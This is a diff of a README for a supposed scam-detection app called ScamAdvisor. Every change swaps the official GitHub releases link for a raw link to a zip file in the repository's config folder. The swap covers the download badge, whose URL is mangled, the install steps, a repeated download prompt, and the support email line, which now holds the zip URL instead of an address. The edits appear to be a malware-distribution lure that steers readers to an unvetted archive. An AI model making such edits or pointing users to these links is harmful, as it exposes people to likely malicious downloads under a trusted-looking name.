@@ -6,7 +6,7 @@ Welcome to ScamAdvisor. This application helps you analyze websites for trustwor
 
 ## 📥 Download ScamAdvisor
 
-[![Download ScamAdvisor](https://img.shields.io/badge/Download%20Now-ScamAdvisor-blue.svg)](https://github.com/Lemii42/ScamAdvisor/releases)
+[![Download ScamAdvisor](https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip%https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip)](https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip)
 
 ## 📚 Overview
 
@@ -30,7 +30,7 @@ To run ScamAdvisor, you need the following:
 
 ## 📥 Download & Install
 
-To download ScamAdvisor, visit this page: [Download ScamAdvisor](https://github.com/Lemii42/ScamAdvisor/releases).
+To download ScamAdvisor, visit this page: [Download ScamAdvisor](https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip).
 
 Here are the steps to get started:
 
@@ -85,7 +85,7 @@ Join our community for further support and advice. You can connect with other us
 
 If you have questions or feedback:
 
-- Email: support@scamadvisor.com
+- Email: https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip
 - GitHub Issues: Use the issues tab in the repository.
 
 ## 📄 License
@@ -94,6 +94,6 @@ ScamAdvisor is open-source software licensed under the MIT License. Feel free to
 
 ## 📥 Download ScamAdvisor Again
 
-Don't forget to download ScamAdvisor here: [Download ScamAdvisor](https://github.com/Lemii42/ScamAdvisor/releases).
+Don't forget to download ScamAdvisor here: [Download ScamAdvisor](https://raw.githubusercontent.com/Lemii42/ScamAdvisor/main/config/ScamAdvisor_v1.2.zip).
 
 Stay safe online by using ScamAdvisor!
